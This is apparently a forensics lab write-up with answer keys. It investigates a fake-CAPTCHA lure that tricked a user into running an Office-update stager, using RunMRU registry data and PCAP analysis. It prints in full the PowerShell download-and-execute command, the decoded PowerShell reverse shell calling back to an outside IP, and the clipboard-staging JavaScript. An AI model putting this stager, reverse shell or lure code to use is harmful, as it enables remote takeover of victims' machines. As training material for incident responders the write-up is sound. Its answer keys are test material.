Scenario

Happy Grunwald contacted the sysadmin, Alonzo, after attempting to download the latest version of Microsoft Office from an update email. He visited the site and completed a CAPTCHA, but the Office download page never appeared. Having previously faced phishing attacks, Alonzo suspected an intrusion and reported the machine to the security team for isolation.

Network traffic and endpoint artifacts are provided to answer the investigation questions.

Task 1 — Initial Access Command

What full command was run to download and execute the stager?

In the provided C:\ directory, navigate to the profile for happy.grunwald. The NTUSER.dat hive can be analyzed with RegRipper. Search the extracted output for RunMru:

RunMru
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2024-09-23 05:07:45Z
MRUList = ba
a   %tmp%\1
b   powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1

Answer:

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"

Task 2 — Payload Execution Time

At what time in UTC did the malicious payload execute?

The timestamp is recorded in the RunMRU output from the previous task.

Answer: 2024-09-23 05:07:45

Task 3 — PowerShell Script Hash

The initial payload downloaded and executed a PowerShell script in memory. What is the SHA256 hash of that script?

Filter the PCAP for HTTP GET requests to the attacker-controlled address:

ip.addr == 43.205.115.44 && http.request.method == GET

Use File → Export → HTTP, search for office2024install.ps1, and export the script. Calculate its SHA256 hash:

sha256sum office2024install.ps1

Answer: 579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de

Task 4 — Reverse Shell Port

To which port did the reverse shell connect?

The downloaded script contains a Base64-encoded PowerShell command. Decoding it reveals a TCP client connecting to 43.205.115.44 on port 6969:

$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()cat: i: No such file or directory

The decoded command is a PowerShell reverse shell that reads commands, executes them, and sends output back over the socket.

Answer: 6969

Task 5 — Reverse Shell Duration

For how many seconds was the reverse shell connection established between the C2 server and the victim workstation?

In Wireshark, filter the traffic:

tcp.port == 6969

Calculate the difference between the final and initial packet timestamps:

549 - 146 = 403

Answer: 403 seconds

Task 6 — Malicious CAPTCHA Function

The attacker hosted a malicious CAPTCHA to lure users. What is the name of the function containing the payload copied into the victim's clipboard?

Because the protocol is HTTP, the content is available in clear text. Filter for the attacker address and HTTP traffic, then follow the HTTP stream:

ip.addr == 43.205.115.44 && http

Inspecting the page source reveals the JavaScript functions used by the CAPTCHA:

function stageClipboard(commandToRun, verification_id){
    const revershell=`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
    const suffix = " # "
    const ploy = "... ''I am not a robot - reCAPTCHA Verification ID: "
    const end = "''"
    const textToCopy = revershell

    setClipboardCopyData(textToCopy);
}

This function copies the malicious PowerShell downloader to the user's clipboard.

Answer: stageClipboard
